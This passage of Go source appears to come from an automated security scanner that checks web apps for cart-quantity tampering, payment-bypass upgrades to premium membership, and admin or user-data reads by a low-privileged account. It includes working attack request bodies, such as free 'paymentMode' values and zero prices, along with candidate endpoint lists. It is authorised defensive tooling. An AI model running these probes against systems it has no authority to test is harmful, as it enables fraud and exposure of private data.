		for _, marker := range []string{"order", "confirmation", "checkout", "receipt", "invoice"} {
			if strings.Contains(lower, marker) {
				return marker + " marker in response"
			}
		}
		return ""
	}
	if signal := checkoutImpactSignalValue(decoded); signal != "" {
		return signal
	}
	return ""
}

func checkoutImpactSignalValue(value any) string {
	switch typed := value.(type) {
	case map[string]any:
		for key, item := range typed {
			compact := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(key, "_", ""), "-", ""))
			if strings.Contains(compact, "order") || strings.Contains(compact, "confirmation") ||
				strings.Contains(compact, "checkout") || strings.Contains(compact, "receipt") ||
				strings.Contains(compact, "invoice") {
				return fmt.Sprintf("%s=%s", key, summarizeJSONValue(item))
			}
		}
		for _, item := range typed {
			if signal := checkoutImpactSignalValue(item); signal != "" {
				return signal
			}
		}
	case []any:
		for _, item := range typed {
			if signal := checkoutImpactSignalValue(item); signal != "" {
				return signal
			}
		}
	}
	return ""
}

func (v *VerifierAgent) storeCartOrderNumericInvariantFinding(persona syntheticAuthPersona, create cartNumericCreateResult, mutation cartNumericMutationResult, checkout cartNumericCheckoutResult, checkoutOK bool) {
	mutationBytes, _ := json.Marshal(mutation.Body)
	createBytes, _ := json.Marshal(create.Body)
	severity := types.SeverityMedium
	title := fmt.Sprintf("Cart/order item accepts impossible numeric value at %s", mutation.Path)
	description := fmt.Sprintf(
		"%s accepted %s=%s for a disposable low-privileged user's cart/order item. The response confirmed %s.",
		mutation.Path, mutation.Field, summarizeJSONValue(mutation.Value), mutation.Signal)
	impact := "Attackers can tamper with cart/order numeric fields such as quantity, amount, count, or price, breaking server-side business invariants and potentially altering totals, stock, fulfillment, or downstream accounting."
	steps := fmt.Sprintf(
		"1. Register/login a normal low-privileged user.\n"+
			"2. Add product/item %d to cart/basket/container %d via POST %s with body %s.\n"+
			"3. Send %s %s with body %s.\n"+
			"4. Observe the server responds %d and confirms %s.",
		create.ProductID, create.BasketID, create.CreatePath, string(createBytes),
		mutation.Method, mutation.Path, string(mutationBytes), mutation.Status, mutation.Signal)
	pocRequest := fmt.Sprintf(
		"POST %s HTTP/1.1\nHost: <target>\nAuthorization: Bearer <disposable low-privileged token>\nContent-Type: application/json\n\n%s\n\n%s %s HTTP/1.1\nHost: <target>\nAuthorization: Bearer <same token>\nContent-Type: application/json\n\n%s",
		create.CreatePath, string(createBytes), mutation.Method, mutation.Path, string(mutationBytes))
	pocResponse := fmt.Sprintf("Mutation response:\nHTTP/1.1 %d\n\n%s", mutation.Status, truncateString(mutation.RespBody, 700))
	evidence := fmt.Sprintf("Disposable identity: %s\nCreate URL: %s\nMutation URL: %s\nAccepted signal: %s\nStored readback URL: %s\nStored preview: %s",
		persona.Email, create.CreateURL, mutation.URL, mutation.Signal, mutation.StoredURL, truncateString(mutation.StoredBody, 500))
	if checkoutOK {
		severity = types.SeverityHigh
		title = fmt.Sprintf("Cart/order checkout accepts impossible numeric value at %s", mutation.Path)
		description = fmt.Sprintf(
			"%s accepted %s=%s for a disposable low-privileged cart item and checkout completed at %s (%s). This proves the invalid value reaches the order path, not just the item API.",
			mutation.Path, mutation.Field, summarizeJSONValue(mutation.Value), checkout.Path, checkout.Signal)
		impact = "A negative/impossible cart quantity reaching checkout can credit the attacker, corrupt order totals, distort inventory, and create financial/accounting impact. This is a business-logic vulnerability, not a payload reflection bug."
		steps += fmt.Sprintf("\n5. POST %s with body %s and observe checkout/order confirmation: %s.",
			checkout.Path, mustJSON(checkout.Body), checkout.Signal)
		pocRequest += fmt.Sprintf("\n\nPOST %s HTTP/1.1\nHost: <target>\nAuthorization: Bearer <same token>\nContent-Type: application/json\n\n%s",
			checkout.Path, mustJSON(checkout.Body))
		pocResponse += fmt.Sprintf("\n\nCheckout response:\nHTTP/1.1 %d\n\n%s", checkout.Status, truncateString(checkout.RespBody, 700))
		evidence += fmt.Sprintf("\nCheckout URL: %s\nCheckout signal: %s\nCheckout preview: %s",
			checkout.URL, checkout.Signal, truncateString(checkout.RespBody, 500))
	}
	profile := types.PageProfile{ID: mutation.Method + " " + mutation.Path, URL: mutation.URL, Method: mutation.Method}
	v.storeFinding(profile, types.Finding{
		Title:            title,
		Description:      description,
		Severity:         severity,
		Confidence:       types.ConfidenceConfirmed,
		EndpointID:       mutation.Method + " " + mutation.Path,
		VulnType:         "cart_order_numeric_invariant",
		ParamName:        mutation.Field,
		Payload:          summarizeJSONValue(mutation.Value),
		PocRequest:       pocRequest,
		PocResponse:      pocResponse,
		StepsToReproduce: steps,
		Impact:           impact,
		Remediation: "Enforce numeric business invariants server-side at every transition: item create/update, cart readback, price calculation, and checkout. " +
			"Reject negative or impossible quantities/amounts with 400 responses, recompute totals server-side, and never trust client-submitted cart state.",
		Evidence: evidence,
	})
}

// probeEntitlementUpgradePaymentBypass verifies a common business-logic
// invariant: ordinary users should not be able to grant themselves premium,
// membership, subscription, or entitlement state by choosing an unrecognized
// payment path or zero-cost upgrade body. The proof is allowed in active mode
// because it uses a disposable synthetic account and intentionally avoids real
// wallet/card payment modes, so a success mutates only scanner-owned state.
func (v *VerifierAgent) probeEntitlementUpgradePaymentBypass(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	candidates := entitlementUpgradeCandidatesFromTraffic(entries, target)
	if len(candidates) == 0 {
		return
	}
	if !entitlementUpgradeAuthority(v.authority) {
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			fmt.Sprintf("Found %d entitlement/subscription upgrade candidate(s), but skipped payment-bypass proof because testing authority is %q.",
				len(candidates), firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{"required_authority": policy.AuthorityActive})
		return
	}

	persona, ok := v.ensureSyntheticLowPrivilegePersona(ctx, target, entries)
	if !ok || len(persona.Headers) == 0 || persona.UserID <= 0 {
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			"Could not create/login a synthetic low-privileged user for entitlement/subscription upgrade testing.",
			target, nil)
		return
	}
	headers := activeWriteAuthHeaders(persona.Headers)
	if len(headers) == 0 {
		headers = cloneHeaderMap(persona.Headers)
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Testing %d entitlement/subscription upgrade endpoint candidate(s) with disposable low-privileged user %s.",
			len(candidates), persona.Email),
		target, map[string]any{"persona_user_id": persona.UserID, "persona_source": persona.Source})

	const maxCandidates = 6
	for i, candidate := range candidates {
		if ctx.Err() != nil || i >= maxCandidates {
			return
		}
		if result, ok := v.tryEntitlementUpgradePaymentBypass(ctx, candidate, persona, headers); ok {
			v.confirmed++
			v.storeEntitlementUpgradeFinding(candidate, persona, result)
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s granted upgraded entitlement state to synthetic low-privileged user %s without a recognized payment path (%s).",
					candidate.Path, persona.Email, result.Signal),
				candidate.URL, map[string]any{
					"persona_user_id": persona.UserID,
					"source":          candidate.Source,
					"readback":        result.ReadbackURL,
					"readback_signal": result.ReadbackSignal,
				})
			return
		}
	}
}

func entitlementUpgradeAuthority(authority policy.TestingAuthority) bool {
	switch authority {
	case policy.AuthorityActive, policy.AuthorityFullControl:
		return true
	default:
		return false
	}
}

func (v *VerifierAgent) tryEntitlementUpgradePaymentBypass(ctx context.Context, candidate entitlementUpgradeCandidate, persona syntheticAuthPersona, headers map[string]string) (entitlementUpgradeResult, bool) {
	// A cheap baseline GET both warms the handler and gives the report
	// context such as current plan/membership cost. The result is not used as
	// a gate because some upgrade endpoints are POST-only.
	baselineStatus, baselineBody := 0, ""
	if resp, body, _, err := v.proactiveGETWithHeaders(ctx, candidate.URL, headers,
		"AOBTD/Verifier (entitlement upgrade baseline)"); err == nil && resp != nil {
		v.tested++
		baselineStatus = resp.StatusCode
		baselineBody = body
	} else if err == nil {
		v.tested++
	}

	bodies := entitlementUpgradeBodies(persona.UserID)
	for _, body := range bodies {
		if ctx.Err() != nil {
			return entitlementUpgradeResult{}, false
		}
		bodyBytes, _ := json.Marshal(body)
		status, respBody, ok := v.sendJSONWithHeaders(ctx, http.MethodPost, candidate.URL, bodyBytes, headers,
			"AOBTD/Verifier (entitlement upgrade payment-bypass probe)")
		v.tested++
		if !ok {
			continue
		}
		if status < 200 || status >= 300 {
			v.dismissed++
			continue
		}
		signal := entitlementUpgradeSuccessSignal(respBody)
		token := extractAuthTokenFromJSON([]byte(respBody))
		readHeaders := cloneHeaderMap(headers)
		if token != "" {
			readHeaders["Authorization"] = "Bearer " + token
		}
		readURL, readStatus, readBody, readSignal := v.entitlementUpgradeReadback(ctx, candidate, readHeaders, token)
		if signal == "" && readSignal == "" {
			v.dismissed++
			continue
		}
		if signal == "" {
			signal = readSignal
		}
		return entitlementUpgradeResult{
			Body:           body,
			Status:         status,
			ResponseBody:   respBody,
			Signal:         signal,
			TokenReturned:  token != "",
			ReadbackURL:    readURL,
			ReadbackStatus: readStatus,
			ReadbackBody:   readBody,
			ReadbackSignal: readSignal,
			BaselineStatus: baselineStatus,
			BaselineBody:   baselineBody,
		}, true
	}
	return entitlementUpgradeResult{}, false
}

type entitlementUpgradeCandidate struct {
	URL      string
	Path     string
	Source   string
	Priority int
}

type entitlementUpgradeResult struct {
	Body           map[string]any
	Status         int
	ResponseBody   string
	Signal         string
	TokenReturned  bool
	ReadbackURL    string
	ReadbackStatus int
	ReadbackBody   string
	ReadbackSignal string
	BaselineStatus int
	BaselineBody   string
}

type privilegedReadCandidate struct {
	URL      string
	Path     string
	Source   string
	Priority int
}

type privilegedReadResult struct {
	AnonStatus      int
	AnonBody        string
	AnonContentType string
	AuthStatus      int
	AuthBody        string
	AuthContentType string
	Signal          apiExposureSignal
}

var entitlementUpgradePathRE = regexp.MustCompile(`(?i)/(?:api|rest)/[A-Za-z0-9_./{}$:-]*(?:deluxe|premium|membership|subscriptions?|upgrade|plans?|entitlements?|tiers?)[A-Za-z0-9_./{}$:-]*`)

func entitlementUpgradeCandidatesFromTraffic(entries []types.TrafficEntry, target string) []entitlementUpgradeCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}
	origin = strings.TrimRight(origin, "/")

	seen := make(map[string]bool)
	var out []entitlementUpgradeCandidate
	add := func(path, source string, priority int) {
		path = normalizeEntitlementUpgradePath(path)
		if path == "" || !entitlementUpgradePathLooksRelevant(path) {
			return
		}
		key := path
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, entitlementUpgradeCandidate{
			URL:      origin + path,
			Path:     path,
			Source:   source,
			Priority: priority + entitlementUpgradePathPriority(path),
		})
	}

	observedSurface := false
	for _, entry := range entries {
		path := requestPathFromTrafficEntry(entry)
		text := strings.ToLower(path + " " + entry.Request.URL)
		if trafficEntryLooksJavaScript(entry) || strings.Contains(strings.ToLower(entry.Response.ContentType), "json") ||
			strings.Contains(strings.ToLower(entry.Response.ContentType), "html") {
			text += " " + strings.ToLower(string(entry.Response.Body))
		}
		if entitlementUpgradeTextLooksRelevant(text) {
			observedSurface = true
		}
		if entitlementUpgradePathLooksRelevant(path) {
			add(path, "observed request path with entitlement/subscription semantics", 8)
		}
		for _, match := range entitlementUpgradePathRE.FindAllString(text, 24) {
			add(match, "client artifact or response referenced an entitlement/subscription endpoint", 10)
		}
	}
	if observedSurface || len(out) > 0 {
		for _, path := range []string{
			"/rest/deluxe-membership",
			"/api/membership/upgrade",
			"/api/subscription/upgrade",
			"/api/subscriptions/upgrade",
			"/api/account/upgrade",
			"/api/users/me/upgrade",
			"/api/entitlements/upgrade",
			"/api/plans/upgrade",
			"/api/premium/upgrade",
			"/api/tier/upgrade",
		} {
			add(path, "bounded fallback for common entitlement/subscription upgrade routes after recon saw upgrade semantics", 1)
		}
	}

	sort.SliceStable(out, func(i, j int) bool {
		if out[i].Priority != out[j].Priority {
			return out[i].Priority > out[j].Priority
		}
		return out[i].Path < out[j].Path
	})
	if len(out) > 10 {
		return out[:10]
	}
	return out
}

func normalizeEntitlementUpgradePath(path string) string {
	path = strings.TrimSpace(path)
	path = strings.Trim(path, `"'`)
	if path == "" {
		return ""
	}
	if strings.HasPrefix(path, "http://") || strings.HasPrefix(path, "https://") {
		parsed, err := url.Parse(path)
		if err != nil {
			return ""
		}
		path = parsed.EscapedPath()
		if parsed.RawQuery != "" {
			path += "?" + parsed.RawQuery
		}
	}
	if !strings.HasPrefix(path, "/") {
		return ""
	}
	if idx := strings.IndexAny(path, "\"'<> \t\r\n\\"); idx >= 0 {
		path = path[:idx]
	}
	if strings.Contains(path, "%7B") || strings.Contains(path, "{") || strings.Contains(path, ":id") || strings.Contains(path, "$") {
		return ""
	}
	path = strings.Split(path, "#")[0]
	if q := strings.Index(path, "?"); q >= 0 {
		path = path[:q]
	}
	return strings.TrimRight(path, "/")
}

func entitlementUpgradeTextLooksRelevant(text string) bool {
	lower := strings.ToLower(text)
	hasUpgrade := false
	for _, term := range []string{"upgrade", "become", "activate", "subscribe", "enroll", "join"} {
		if strings.Contains(lower, term) {
			hasUpgrade = true
			break
		}
	}
	hasEntitlement := false
	for _, term := range []string{"membership", "subscription", "premium", "deluxe", "plan", "tier", "entitlement"} {
		if strings.Contains(lower, term) {
			hasEntitlement = true
			break
		}
	}
	return hasUpgrade && hasEntitlement
}

func entitlementUpgradePathLooksRelevant(path string) bool {
	lower := strings.ToLower(path)
	if lower == "" {
		return false
	}
	for _, blocked := range []string{
		"challenge", "score", "captcha", "feedback", "review", "comment",
		"socket.io", ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg",
		"securityquestion", "metrics", "health", "swagger",
	} {
		if strings.Contains(lower, blocked) {
			return false
		}
	}
	for _, term := range []string{"membership", "subscription", "premium", "deluxe", "upgrade", "entitlement", "/plan", "/plans", "/tier", "/tiers"} {
		if strings.Contains(lower, term) {
			return true
		}
	}
	return false
}

func entitlementUpgradePathPriority(path string) int {
	lower := strings.ToLower(path)
	score := 0
	for _, term := range []string{"upgrade", "membership", "subscription", "premium", "deluxe", "entitlement"} {
		if strings.Contains(lower, term) {
			score += 3
		}
	}
	if strings.Contains(lower, "/rest/") || strings.Contains(lower, "/api/") {
		score += 1
	}
	return score
}

func entitlementUpgradeBodies(userID int64) []map[string]any {
	userKeys := []string{"UserId", "userId", "user_id"}
	paymentModes := []string{"none", "free", "manual", "invoice", "aobtd-proof"}
	seen := make(map[string]bool)
	var out []map[string]any
	add := func(body map[string]any) {
		keyBytes, _ := json.Marshal(body)
		key := string(keyBytes)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, cloneJSONMap(body))
	}
	for _, userKey := range userKeys {
		for _, mode := range paymentModes {
			add(map[string]any{userKey: userID, "paymentMode": mode})
		}
	}
	for _, body := range []map[string]any{
		{"paymentMode": "none"},
		{"paymentMethod": "none", "plan": "premium"},
		{"payment_method": "none", "plan": "premium"},
		{"plan": "premium", "tier": "premium", "amount": 0},
		{"plan": "premium", "price": 0, "total": 0},
		{"membership": "premium", "paymentMode": "none"},
		{"subscription": "premium", "paymentMode": "none"},
		{"entitlement": "premium", "paymentMode": "none"},
	} {
		add(body)
	}
	return out
}

func (v *VerifierAgent) entitlementUpgradeReadback(ctx context.Context, candidate entitlementUpgradeCandidate, headers map[string]string, token string) (string, int, string, string) {
	if token != "" {
		if signal := entitlementTokenSignal(token); signal != "" {
			return "(response token)", 0, "", signal
		}
	}
	origin := strings.TrimRight(originFromURL(candidate.URL), "/")
	paths := []string{candidate.Path, "/rest/user/whoami", "/api/me", "/api/user/me", "/api/profile", "/api/account", "/api/session"}
	seen := make(map[string]bool)
	for _, path := range paths {
		if ctx.Err() != nil {
			return "", 0, "", ""
		}
		path = normalizeEntitlementUpgradePath(path)
		if path == "" || seen[path] {
			continue
		}
		seen[path] = true
		rawURL := origin + path
		resp, body, _, err := v.proactiveGETWithHeaders(ctx, rawURL, headers,
			"AOBTD/Verifier (entitlement upgrade readback)")
		v.tested++
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
			if err == nil {
				v.dismissed++
			}
			continue
		}
		if signal := entitlementUpgradeReadbackSignal(body); signal != "" {
			return rawURL, resp.StatusCode, body, signal
		}
	}
	return "", 0, "", ""
}

func entitlementUpgradeSuccessSignal(body string) string {
	lower := strings.ToLower(body)
	if strings.TrimSpace(lower) == "" {
		return ""
	}
	for _, negative := range []string{"insufficient", "not enough", "declined", "invalid payment", "payment required", "unauthorized", "forbidden", `"status":"error"`, `"success":false`} {
		if strings.Contains(strings.ReplaceAll(lower, " ", ""), strings.ReplaceAll(negative, " ", "")) || strings.Contains(lower, negative) {
			return ""
		}
	}
	for _, phrase := range []string{
		"now a deluxe member",
		"now a premium member",
		"subscription active",
		"membership active",
		"entitlement granted",
		"upgrade successful",
		"upgraded successfully",
		"plan changed",
	} {
		if strings.Contains(lower, phrase) {
			return phrase
		}
	}
	hasSuccess := false
	for _, term := range []string{"success", "successful", "congrat", "confirmed", "activated", "upgraded", "granted"} {
		if strings.Contains(lower, term) {
			hasSuccess = true
			break
		}
	}
	hasEntitlement := false
	for _, term := range []string{"membership", "subscription", "premium", "deluxe", "entitlement", "plan", "tier"} {
		if strings.Contains(lower, term) {
			hasEntitlement = true
			break
		}
	}
	if hasSuccess && hasEntitlement {
		return "success response contains entitlement/subscription state"
	}
	if token := extractAuthTokenFromJSON([]byte(body)); token != "" {
		if signal := entitlementTokenSignal(token); signal != "" {
			return signal
		}
	}
	return ""
}

func entitlementUpgradeReadbackSignal(body string) string {
	if signal := entitlementUpgradeSuccessSignal(body); signal != "" {
		return signal
	}
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		return ""
	}
	if signal := entitlementUpgradeJSONStateSignal(decoded); signal != "" {
		return signal
	}
	return ""
}

func entitlementUpgradeJSONStateSignal(value any) string {
	switch typed := value.(type) {
	case map[string]any:
		for key, item := range typed {
			compact := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(key, "_", ""), "-", ""))
			if entitlementStateKeyLooksPositive(compact, item) {
				return fmt.Sprintf("%s=%s", key, summarizeJSONValue(item))
			}
		}
		for _, item := range typed {
			if signal := entitlementUpgradeJSONStateSignal(item); signal != "" {
				return signal
			}
		}
	case []any:
		for _, item := range typed {
			if signal := entitlementUpgradeJSONStateSignal(item); signal != "" {
				return signal
			}
		}
	}
	return ""
}

func entitlementStateKeyLooksPositive(compactKey string, value any) bool {
	keyLooksEntitled := false
	for _, term := range []string{"deluxe", "premium", "membership", "subscription", "entitlement", "plan", "tier"} {
		if strings.Contains(compactKey, term) {
			keyLooksEntitled = true
			break
		}
	}
	if !keyLooksEntitled {
		return false
	}
	switch typed := value.(type) {
	case bool:
		return typed
	case string:
		lower := strings.ToLower(strings.TrimSpace(typed))
		if lower == "" || lower == "false" || lower == "none" || lower == "inactive" || lower == "basic" || lower == "free" {
			return false
		}
		for _, term := range []string{"active", "premium", "deluxe", "member", "subscribed", "granted", "true"} {
			if strings.Contains(lower, term) {
				return true
			}
		}
	case float64:
		return typed > 0 && !strings.Contains(compactKey, "cost") && !strings.Contains(compactKey, "price")
	case int:
		return typed > 0 && !strings.Contains(compactKey, "cost") && !strings.Contains(compactKey, "price")
	case int64:
		return typed > 0 && !strings.Contains(compactKey, "cost") && !strings.Contains(compactKey, "price")
	}
	return false
}

func entitlementTokenSignal(token string) string {
	_, payload, _, ok := jwtDecodeSignedJWTPayload(token)
	if !ok || payload == nil {
		return ""
	}
	if signal := entitlementUpgradeJSONStateSignal(payload); signal != "" {
		return "response token contains upgraded entitlement claim: " + signal
	}
	return ""
}

func (v *VerifierAgent) storeEntitlementUpgradeFinding(candidate entitlementUpgradeCandidate, persona syntheticAuthPersona, result entitlementUpgradeResult) {
	bodyBytes, _ := json.Marshal(result.Body)
	title := fmt.Sprintf("Low-privileged user can self-upgrade entitlement at %s", candidate.Path)
	description := fmt.Sprintf(
		"%s accepted a synthetic low-privileged user's upgrade request without a recognized payment path and returned %s. Source: %s.",
		candidate.Path, result.Signal, candidate.Source)
	redactedBaseline := redact.Text(result.BaselineBody)
	redactedResponse := redact.Text(result.ResponseBody)
	redactedReadback := redact.Text(result.ReadbackBody)
	readback := "not available"
	if result.ReadbackURL != "" {
		readback = fmt.Sprintf("%s status=%d signal=%s", result.ReadbackURL, result.ReadbackStatus, result.ReadbackSignal)
	}
	evidence := fmt.Sprintf(
		"Synthetic user: %s (id=%d)\nURL: %s\nRequest body: %s\nStatus: %d\nSignal: %s\nToken returned: %t\nReadback: %s\nBaseline status: %d\nBaseline preview: %s\nResponse preview: %s\nReadback preview: %s",
		persona.Email, persona.UserID, candidate.URL, string(bodyBytes), result.Status, result.Signal,
		result.TokenReturned, readback, result.BaselineStatus, truncateString(redactedBaseline, 500),
		truncateString(redactedResponse, 800), truncateString(redactedReadback, 800))
	profile := types.PageProfile{ID: "POST " + candidate.Path, URL: candidate.URL, Method: http.MethodPost}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityHigh,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  "POST " + candidate.Path,
		VulnType:    "entitlement_upgrade_payment_bypass",
		ParamName:   "paymentMode",
		Payload:     summarizeJSONValue(result.Body["paymentMode"]),
		PocRequest: fmt.Sprintf(
			"POST %s HTTP/1.1\nHost: <target>\nAuthorization: Bearer <synthetic low-privileged user token>\nContent-Type: application/json\n\n%s",
			candidate.Path, string(bodyBytes)),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", result.Status, truncateString(redactedResponse, 900)),
		StepsToReproduce: fmt.Sprintf(
			"1. Register/login a normal low-privileged user.\n"+
				"2. Send POST %s with body %s.\n"+
				"3. Observe the server returns %d and signals %s.\n"+
				"4. If a token/readback is returned, inspect the account state and observe %s.",
			candidate.Path, string(bodyBytes), result.Status, result.Signal, firstNonBlank(result.ReadbackSignal, "the upgraded entitlement state")),
		Impact: "A low-privileged account can grant itself paid/premium/member functionality without completing the intended payment or approval workflow. " +
			"This can bypass revenue controls, feature gating, support approvals, and authorization boundaries tied to subscription state.",
		Remediation: "Model upgrades as server-side state transitions backed by verified payment/approval records. Reject unrecognized payment modes, ignore client-submitted price/amount/tier authority, and verify the acting user is allowed to change only their own entitlement through the intended workflow.",
		Evidence:    evidence,
	})
}

var privilegedReadPathRE = regexp.MustCompile(`(?i)/(?:api|rest)/[A-Za-z0-9_./{}$:-]*(?:admin|manage|management|moderation|moderator|support|audit|logs?|users?|accounts?|customers?|feedbacks?|complaints?|reports?|tickets?)[A-Za-z0-9_./{}$:-]*`)

// probeLowPrivilegePrivilegedReads checks a generic BAC invariant: a freshly
// created ordinary user should not be able to read admin/support/moderation
// collections or user-management APIs. It is allowed in active mode: account
// creation is bounded to a disposable persona and the proof requests are
// read-only.
func (v *VerifierAgent) probeLowPrivilegePrivilegedReads(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	candidates := privilegedReadCandidatesFromTraffic(entries, target)
	if len(candidates) == 0 {
		return
	}
	if !lowPrivilegePrivilegedReadAuthority(v.authority) {
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			fmt.Sprintf("Found %d privileged read candidate(s), but skipped low-privilege BAC proof because testing authority is %q.",
				len(candidates), firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{"required_authority": policy.AuthorityActive})
		return
	}

	persona, ok := v.ensureSyntheticLowPrivilegePersona(ctx, target, entries)
	if !ok || len(persona.Headers) == 0 {
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			"Could not create/login a synthetic low-privileged user for privileged-read BAC testing.",
			target, nil)
		return
	}
	headers := activeWriteAuthHeaders(persona.Headers)
	if len(headers) == 0 {
		headers = cloneHeaderMap(persona.Headers)
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Testing whether disposable low-privileged user %s can read %d admin/support/user-management endpoint candidate(s).",
			persona.Email, len(candidates)),
		target, map[string]any{"persona_user_id": persona.UserID, "persona_source": persona.Source})

	const maxCandidates = 10
	for i, candidate := range candidates {
		if ctx.Err() != nil || i >= maxCandidates {
			return
		}
		result, ok := v.tryLowPrivilegePrivilegedRead(ctx, candidate, headers)
		if !ok {
			continue
		}
		v.confirmed++
		v.storeLowPrivilegePrivilegedReadFinding(candidate, persona, result)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s returned privileged data to ordinary synthetic user %s (%s).",
				candidate.Path, persona.Email, result.Signal.Signal),
			candidate.URL, map[string]any{
				"persona_user_id":  persona.UserID,
				"source":           candidate.Source,
				"anonymous_status": result.AnonStatus,
				"authenticated":    result.AuthStatus,
			})
		return
	}
}

func (v *VerifierAgent) tryLowPrivilegePrivilegedRead(ctx context.Context, candidate privilegedReadCandidate, headers map[string]string) (privilegedReadResult, bool) {
	v.tested++
	anonResp, anonBody, _, anonErr := v.proactiveGETWithHeaders(ctx, candidate.URL, nil,
		"AOBTD/Verifier (privileged-read anonymous baseline)")
	result := privilegedReadResult{AnonBody: anonBody}
	if anonResp != nil {
		result.AnonStatus = anonResp.StatusCode
		result.AnonContentType = anonResp.Header.Get("Content-Type")
	}
	if anonErr == nil && anonResp != nil && anonResp.StatusCode >= 200 && anonResp.StatusCode < 300 {
		if signal := privilegedReadResponseSignal(candidate.Path, result.AnonContentType, anonBody); signal.Signal != "" {
			v.dismissed++
			v.db.InsertNarration(v.scanID, "verifier", "dismissed",
				fmt.Sprintf("%s already exposes privileged-looking data anonymously; treating it as exposure/noise instead of low-privilege BAC.",
					candidate.Path),
				candidate.URL, map[string]any{"anonymous_signal": signal.Signal})
			return privilegedReadResult{}, false
		}
	}

	authResp, authBody, _, err := v.proactiveGETWithHeaders(ctx, candidate.URL, headers,
		"AOBTD/Verifier (privileged-read low-privileged user)")
	if err != nil || authResp == nil {
		return privilegedReadResult{}, false
	}
	result.AuthStatus = authResp.StatusCode
	result.AuthBody = authBody
	result.AuthContentType = authResp.Header.Get("Content-Type")
	if authResp.StatusCode < 200 || authResp.StatusCode >= 300 {
		v.dismissed++
		return privilegedReadResult{}, false
	}
	signal := privilegedReadResponseSignal(candidate.Path, result.AuthContentType, authBody)
	if signal.Signal == "" {
		v.dismissed++
		return privilegedReadResult{}, false
	}
	result.Signal = signal
	return result, true
}

func lowPrivilegePrivilegedReadAuthority(authority policy.TestingAuthority) bool {
	switch authority {
	case policy.AuthorityActive, policy.AuthorityFullControl:
		return true
	default:
		return false
	}
}

func privilegedReadCandidatesFromTraffic(entries []types.TrafficEntry, target string) []privilegedReadCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			if origin = originFromURL(entry.Request.URL); origin != "" {
				break
			}
		}
	}
	origin = strings.TrimRight(origin, "/")
	seen := make(map[string]privilegedReadCandidate)
	add := func(path, source string) {
		path = normalizePrivilegedReadPath(path)
		if path == "" || origin == "" || !privilegedReadPathLooksRelevant(path) {
			return
		}
		priority := privilegedReadPathPriority(path)
		key := strings.ToLower(path)
		candidate := privilegedReadCandidate{
			URL:      origin + path,
			Path:     path,
			Source:   source,
			Priority: priority,
		}
		if prev, ok := seen[key]; !ok || candidate.Priority > prev.Priority {
			seen[key] = candidate
		}
	}

	observedPrivilegedSemantics := false
	for _, entry := range entries {
		path := requestPathFromTrafficEntry(entry)
		if strings.EqualFold(entry.Request.Method, http.MethodGet) && privilegedReadPathLooksRelevant(path) {
			observedPrivilegedSemantics = true
			add(path, "observed GET endpoint")
		}
		text := string(entry.Response.Body)
		if text == "" {
			text = string(entry.Request.Body)
		}
		if !privilegedReadTextLooksRelevant(text) {
			continue
		}
		observedPrivilegedSemantics = true
		for _, match := range privilegedReadPathRE.FindAllString(text, 24) {
			add(match, "linked from captured traffic/client artifact")
		}
	}

	if observedPrivilegedSemantics {
		for _, fallback := range []string{
			"/api/Users", "/api/users", "/api/admin/users", "/rest/admin/users",
			"/api/accounts", "/api/customers", "/api/Feedbacks", "/api/feedbacks",
			"/api/Complaints", "/api/complaints", "/api/reports", "/api/audit",
			"/api/logs", "/api/support/tickets", "/rest/admin/logs",
		} {
			add(fallback, "bounded fallback after privileged semantics were observed")
		}
	}

	out := make([]privilegedReadCandidate, 0, len(seen))
	for _, candidate := range seen {
		out = append(out, candidate)
	}
	sort.SliceStable(out, func(i, j int) bool {
		if out[i].Priority != out[j].Priority {
			return out[i].Priority > out[j].Priority
		}
		if out[i].Path != out[j].Path {
			return out[i].Path < out[j].Path
		}
		return out[i].Source < out[j].Source
	})
	if len(out) > 14 {
		out = out[:14]
	}
	return out
}

func normalizePrivilegedReadPath(path string) string {
	path = strings.TrimSpace(path)
	if path == "" {
		return ""
	}
	if parsed, err := url.Parse(path); err == nil {
		if parsed.Scheme != "" && parsed.Host != "" {
			path = parsed.Path
		}
		if parsed.RawQuery != "" {
			path += "?" + parsed.RawQuery
		}
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	if cut := strings.IndexAny(path, "\"'`<>\\"); cut >= 0 {
		path = path[:cut]
	}
	path = strings.TrimRight(path, ".;,)")
	if path == "" {
		return ""
	}
	return path
}

func privilegedReadTextLooksRelevant(text string) bool {
	if strings.TrimSpace(text) == "" {
		return false
	}
	lower := strings.ToLower(text)
	for _, marker := range []string{
		"/api/users", "/api/user", "/api/admin", "/rest/admin", "/api/support",
		"/api/audit", "/api/log", "/api/accounts", "/api/customers", "/api/feedback",
		"/api/complaint", "/api/report", "management", "moderation",
	} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func privilegedReadPathLooksRelevant(path string) bool {
	lower := strings.ToLower(path)
